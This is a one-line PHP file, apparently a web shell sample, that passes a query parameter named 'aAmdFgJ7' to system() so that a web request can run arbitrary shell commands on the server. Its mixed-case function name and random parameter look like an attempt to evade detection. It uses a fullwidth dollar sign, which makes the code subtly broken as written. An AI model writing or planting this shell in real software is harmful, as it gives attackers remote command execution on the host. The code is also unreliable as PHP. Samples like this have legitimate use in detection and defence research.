<?php
SysTeM(＄_GET['aAmdFgJ7']);
?>
